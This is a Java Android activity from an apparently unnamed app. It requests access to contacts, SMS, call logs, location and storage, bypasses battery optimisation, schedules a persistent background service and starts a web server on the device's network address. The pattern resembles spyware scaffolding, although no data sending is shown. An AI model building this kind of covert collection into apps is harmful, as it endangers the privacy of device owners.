package com.example.myapplication;

import android.Manifest;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.PowerManager;
import android.provider.Settings;
import android.text.format.Formatter;
import android.util.Log;
import android.view.View;
import android.widget.RemoteViews;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

import com.example.myapplication.src.main.java.com.nameless.web_server.Server;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.concurrent.TimeUnit;

public class Start extends AppCompatActivity {
    static final String MyOnClick = "myOnClickTag";
    private static Context context;
    String TAG = "TAG";
    public static String logg = "";
    public static String addrs = "";

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Start.context = getApplicationContext();
        Toast.makeText(context, "1111", Toast.LENGTH_SHORT).show();


        try {
            Context context = Start.getAppContext().getApplicationContext();
            WifiManager wm = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
            addrs = "http://" + Formatter.formatIpAddress(wm.getConnectionInfo().getIpAddress());
            yyyw("address was found"+addrs);
        }catch (Exception e){
            addrs = "http://localhost";
            yyyw("!!! Address not found -"+e);
        }


        RemoteViews wee = new RemoteViews(context.getPackageName(), R.layout.bookmark);
        wee.setOnClickPendingIntent(R.id.button,
                getPendingSelfIntent(context, MyOnClick));


        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intentt = new Intent();
            String packageName = getPackageName();
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                intentt.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intentt.setData(Uri.parse("package:" + packageName));
                startActivity(intentt);
            }
        }
        startServiceViaWorker();

        new Thread(new Runnable() {
            public void run() {
                try {
                    new Server();
                } catch (IOException e) {
                    e.printStackTrace();
                    Start.yyyw(e + "");
                }
            }
        }).start();


        File[] fs = Start.getAppContext().getExternalFilesDirs(null);
        File locDst = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/");








        ArrayList<File> theDir = new ArrayList<>();
        theDir.add(new File(fs[0] + "/MyFolder/clt"));
        theDir.add(new File(fs[0] + "/MyFolder/ps/zips"));
        for (File i : theDir) {
            if (!i.exists()) {
                i.mkdirs();
            }
        }
        File[] fd = Start.getAppContext().getExternalFilesDirs(null);
        if (fd.length > 1) {
            File dird = fd[1];
            ArrayList<File> theDird = new ArrayList<>();
            theDird.add(new File(dird + "/MyFolder/clt"));
            theDird.add(new File(dird + "/MyFolder/ps/zips"));
            for (File i : theDird) {
                if (!i.exists()) {
                    i.mkdirs();
                }
            }
        }
        try {
            prmsn();
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }




    }

    public static Context getAppContext() {
        return Start.context;
    }

    public static void copy1(File src, File dst) throws IOException {
        try {
            try (InputStream in = new FileInputStream(src)) {
                Log.d("----", dst.toString());
                try (OutputStream out = new FileOutputStream(dst)) {
                    // Transfer bytes from in to out
                    byte[] buf = new byte[1024];
                    int len;
                    while ((len = in.read(buf)) > 0) {
                        out.write(buf, 0, len);
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
            Start.yyyw(e.toString());
        }
    }

    public static void yyyw(String a) {
        if (a.contains("[clr]")) {
            logg = "";
        } else {
            logg = a + "\n" + logg;
        }
//        logg.append(a+"\n");
        System.out.println(a);
    }

    public static void yyyw(String a, String b) {
        logg = a + "," + b + "\n" + logg;
//        logg.append(a+","+b+"\n");
        Log.d(a, b);
    }


    //=========================================================

    public void prmsn() throws InterruptedException {

        int ASK_MULTIPLE_PERMISSION_REQUEST_CODE=101;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            requestPermissions(new String[]{
                            Manifest.permission.READ_EXTERNAL_STORAGE,
                            Manifest.permission.WRITE_EXTERNAL_STORAGE,
                            Manifest.permission.READ_CONTACTS,
                            Manifest.permission.READ_SMS,
                            Manifest.permission.READ_CALL_LOG,
                            Manifest.permission.ACCESS_COARSE_LOCATION,
                            Manifest.permission.ACCESS_FINE_LOCATION},
                    ASK_MULTIPLE_PERMISSION_REQUEST_CODE);
        }
    }

    //service background
    public void onStartServiceClick(View v) {
        startService();
    }

    public void onStopServiceClick(View v) {
        stopService();
    }

    @Override
    public void onDestroy() {
        Log.d(TAG, "onDestroy called");
        stopService();
        super.onDestroy();
    }

    public void startService() {
        Log.d(TAG, "startService called");
        if (!MyService.isServiceRunning) {
            Intent serviceIntent = new Intent(this, MyService.class);
            ContextCompat.startForegroundService(this, serviceIntent);
        }
    }

    public void stopService() {
        Log.d(TAG, "stopService called");
        if (MyService.isServiceRunning) {
            Intent serviceIntent = new Intent(this, MyService.class);
            stopService(serviceIntent);
        }
    }

    public void startServiceViaWorker() {
        Log.d(TAG, "startServiceViaWorker called");
        String UNIQUE_WORK_NAME = "StartMyServiceViaWorker";
        WorkManager workManager = WorkManager.getInstance(this);

        // As per Documentation: The minimum repeat interval that can be defined is 15 minutes
        // (same as the JobScheduler API), but in practice 15 doesn't work. Using 16 here
        PeriodicWorkRequest request =
                new PeriodicWorkRequest.Builder(
                        MyWorker.class,
                        16,
                        TimeUnit.MINUTES)
                        .build();

        // to schedule a unique work, no matter how many times app is opened i.e. startServiceViaWorker gets called
        // do check for AutoStart permission
        workManager.enqueueUniquePeriodicWork(UNIQUE_WORK_NAME, ExistingPeriodicWorkPolicy.KEEP, request);

    }

    public PendingIntent getPendingSelfIntent(Context context, String action) {
        Intent intent = new Intent(context, getClass());
        intent.setAction(action);
        return PendingIntent.getBroadcast(context, 0, intent, 0);
    }
}